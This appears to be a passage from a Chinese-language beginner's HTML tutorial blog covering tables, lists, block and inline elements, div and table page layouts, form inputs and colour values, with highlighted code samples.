id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>HTML中表格由<code>&lt;table&gt;</code>标签来定义。</p><p>每个表格均有若干行（由<code>&lt;tr&gt;</code>标签定义），每行被分割为若干单元格（由 <code>&lt;td&gt;</code> 标签定义）。</p><p> td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等。</p><h2 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h2><p>如果不定义边框属性，表格将不显示边框。border属性的值科尔决定边框的显示与否。</p><p>例：带有边框的表格</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Row 1, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Row 1, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="表头"><a href="#表头" class="headerlink" title="表头"></a>表头</h2><p>表格的表头由<code>&lt;th&gt;</code>标签进行定义。大多数浏览器会把表头显示为粗体居中的文本。</p><p>例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Header 1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Header 2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 1, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>row 2, cell 2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><table border="1">    <tr>        <th>Header 1</th>        <th>Header 2</th>    </tr>    <tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></table><h2 id="表格常用标签"><a href="#表格常用标签" class="headerlink" title="表格常用标签"></a>表格常用标签</h2><table><thead><tr><th>标签</th><th align="center">作用</th></tr></thead><tbody><tr><td><code>&lt;table&gt;</code></td><td align="center">定义表格</td></tr><tr><td><code>&lt;th&gt;</code></td><td align="center">定义表格的表头</td></tr><tr><td><code>&lt;tr&gt;</code></td><td align="center">定义表格的行</td></tr><tr><td><code>&lt;td&gt;</code></td><td align="center">定义表格单元</td></tr><tr><td><code>&lt;caption&gt;</code></td><td align="center">定义表格标题</td></tr><tr><td><code>&lt;colgroup&gt;</code></td><td align="center">定义表格列的组</td></tr><tr><td><code>&lt;col&gt;</code></td><td align="center">定义用于表格列的属性</td></tr><tr><td><code>&lt;thead&gt;</code></td><td align="center">定义表格的页眉</td></tr><tr><td><code>&lt;tbody&gt;</code></td><td align="center">定义表格的主体</td></tr><tr><td><code>&lt;tfoot&gt;</code></td><td align="center">定义表格的页脚</td></tr></tbody></table><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>HTML列表由有序列表、无序列表和自定义列表。</p><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><p>有序列表是一列项目，列表项目使用<strong>数字</strong>进行标记。 有序列表始于<code>&lt;ol&gt;</code>标签。每个列表项始于 <code>&lt;li&gt; </code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>WEB<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>JAVA<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><ol>    <li>HTML</li>    <li>WEB</li>    <li>JAVA</li><ol><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><p>无序列表是一个项目的列表，此列项目使用<strong>粗体圆点</strong>（典型的小黑圆圈）进行标记。</p><p>无序列表由<code>&lt;ul&gt; </code>标签实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>WEB<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>JAVA<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><ul>    <li>HTML</li>    <li>WEB</li>    <li>JAVA</li><ul><h2 id="自定义列表"><a href="#自定义列表" class="headerlink" title="自定义列表"></a>自定义列表</h2><p>自定义列表不仅仅是一列项目，而是项目及其<strong>注释</strong>的组合。</p><p>自定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>*learn test<span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>WEB<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>**test again<span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>JAVA<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>|*|JAVA is the best language in the world!<span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><dl>    <dt>HTML</dt>    <dd>*learn test<dd>    <dt>WEB</dt>    <dd>**test again<dd>    <dt>JAVA</dt>    <dd>|*|JAVA is the best language in the world!<dd><dl><h1 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h1><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。</p><h2 id="块级元素"><a href="#块级元素" class="headerlink" title="块级元素"></a>块级元素</h2><p>块级元素在浏览器显示时，通常会以<strong>新行</strong>来开始（和结束），如<code> &lt;h1&gt;</code>, <code>&lt;p&gt;</code>,<code>&lt;ul&gt;</code>, <code>&lt;table&gt;</code>，<code>&lt;div&gt;</code></p><p>其中<code>&lt;div&gt;</code>元素可用于组合其他HTML<strong>元素</strong>的容器。<code>&lt;div&gt;</code>元素没有特定的含义，在浏览器中会在它的前后显示折行。若同CSS一起使用，<code>&lt;div&gt;</code>元素可以对大的内容块设置样式属性。同时，<code>&lt;div&gt;</code>还可以用于文档布局，它取代了用表格定义布局的老方法。</p><h2 id="内联元素"><a href="#内联元素" class="headerlink" title="内联元素"></a>内联元素</h2><p>内联元素在显示时通常<strong>不会以新行开始</strong>，如<code>&lt;b&gt;</code>, <code>&lt;td&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;img&gt;</code>，<code>&lt;span&gt;</code></p><p><code>&lt;span&gt;</code>元素可用作<strong>文本</strong>的容器。<code>&lt;span&gt;</code>元素也没有特定的含义，若同CSS一起使用，<code>&lt;span&gt;</code>元素可以给部分文本设置样式属性。</p><h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><p>网站一般使用<code>&lt;div&gt;</code>或<code>&lt;table&gt;</code>来进行布局，但<code>&lt;table&gt;</code>标签不建议作为布局工具使用，表格不是布局工具，最好使用<code>&lt;div&gt;</code></p><h2 id="用-lt-div-gt-元素布局"><a href="#用-lt-div-gt-元素布局" class="headerlink" title="用&lt;div&gt;元素布局"></a>用<code>&lt;div&gt;</code>元素布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:500px&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;header&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: aqua;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom:0;text-align: center;&quot;</span>&gt;</span>TEST<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;menu&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: yellowgreen;height:200px;width:100px;float:left;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        CSS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        JavaScript<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: bisque;height:200px;width:400px;float:left;&quot;</span>&gt;</span></span><br><span class="line">        Lorem ipsum dolor sit amet consectetur, adipisicing elit. Impedit dignissimos libero, provident ex iusto non enim sit aliquam iste harum dicta voluptatum, cum ut temporibus! Repellat ullam blanditiis consectetur. Eligendi.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: grey;text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        ©2021-2022 by a learner<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220129113930187.png"></p><h2 id="用-lt-table-gt-元素（表格）布局"><a href="#用-lt-table-gt-元素（表格）布局" class="headerlink" title="用&lt;table&gt;元素（表格）布局"></a>用<code>&lt;table&gt;</code>元素（表格）布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:aqua;text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>table网格<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background-color:yellowgreen;width:100px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        CSS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        JavaScript</span><br><span class="line">        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background-color:bisque;height:200px;width:400px;&quot;</span>&gt;</span></span><br><span class="line">        Lorem ipsum dolor sit amet consectetur adipisicing elit. Excepturi, temporibus perspiciatis? Ad, repellat asperiores magnam sed perferendis doloremque eos, placeat labore necessitatibus vel illo obcaecati doloribus ratione omnis debitis culpa!<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:gray;text-align:center;&quot;</span>&gt;</span></span><br><span class="line">        ©2021-2022<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220129114516746.png"></p><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p>表单时是一个包含<strong>表单元素</strong>的区域，用于收集不同类型的用户输入</p><p><strong>表单元素</strong>是允许用户在表单中输入内容,如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等</p><p>表单由<code>&lt;form&gt;</code>标签设置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">输入元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多数情况下被用到的表单标签是输入标签（ <code>&lt;input&gt;</code>）。输入类型由类型属性（type）定义</p><h2 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h2><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt; </code>来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><form>    用户名:<input type="text" name="username"><br>    密码:<input type="text" name="password"></form><p>PS：表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。</p><h2 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h2><p>密码字段通过<code>&lt;input type=&quot;password&quot;&gt;</code>来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><form>    密码:<input type="password" name="password"></form><p>PS：密码字段字符不会明文显示，而是以星号或圆点替代。</p><h2 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h2><p>单选按钮通过<code>&lt;input type=&quot;radio&quot;&gt;</code>来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML&quot;</span>&gt;</span>HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;JS&quot;</span>&gt;</span>JS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PHP&quot;</span>&gt;</span>PHP</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><form>    <input type="radio" name="language" value="HTML">HTML<br>    <input type="radio" name="language" value="JS">JS<br>    <input type="radio" name="language" value="PHP">PHP</form><h2 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h2><p>复选框通过<code>&lt;input type=&quot;checkbox&quot;&gt;</code>来定义，用户需要从若干给定的选择中选取一个或若干选项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML&quot;</span>&gt;</span>HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;JS&quot;</span>&gt;</span>JS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;language&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PHP&quot;</span>&gt;</span>PHP</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><form>    <input type="checkbox" name="language" value="HTML">HTML<br>    <input type="checkbox" name="language" value="JS">JS<br>    <input type="checkbox" name="language" value="PHP">PHP</form><h2 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h2><p>提交按钮通过<code>&lt;input type=&quot;submit&quot;&gt;</code>来定义。当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">action</span>=<span class="string">&quot;test.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    姓名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">    电话号码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tel&quot;</span>&gt;</span></span><br><span class="line">    地址:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;adress&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><form name="input" action="test.php" method="get">    姓名:<input type="text" name="user">    电话号码:<input type="text" name="tel">    地址:<input type="text" name="adress">    <input type="submit" value="Submit"></form><p>点击确认按钮后，输入的数据会传送到 “test.php” 的页面，该页面将显示出输入的结果。</p><h1 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h1><p>HTML 颜色由<strong>红色</strong>、<strong>绿色</strong>、<strong>蓝色</strong>混合而成。HTML 颜色由一个十六进制符号来定义，这个符号由红色、绿色和蓝色的值组成（RGB）。</p><h2 id="颜色名"><a href="#颜色名" class="headerlink" title="颜色名"></a>颜色名</h2><p>141个颜色名称是在HTML和CSS颜色规范定义的（17标准颜色，再加124）</p><p>17标准颜色：黑色，蓝色，水，紫红色，灰色，绿色，石灰，栗色，海军，橄榄，橙，紫，红，白，银，蓝绿色，黄色</p><h2 id="颜色值"><a href="#颜色值" class="headerlink" title="颜色值"></a>颜色值</h2><p>每种颜色的最小值是0（十六进制：#00）。最大值是255（十六进制：#FF）</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/image-20220129141947235.png"></p><h3 id="1600万种颜色"><a href="#1600万种颜色" class="headerlink" title="1600万种颜色"></a>1600万种颜色</h3><p>三种颜色 红，绿，蓝的组合从0到255，一共有1600万种不同颜色(256 x 256 x 256)。</p><p>在下面的颜色表中你会看到不同的结果，从0到255的红色，同时设置绿色和蓝色的值为0,随着红色的值变化，不同的值都显示了不同的颜色。</p><p><img 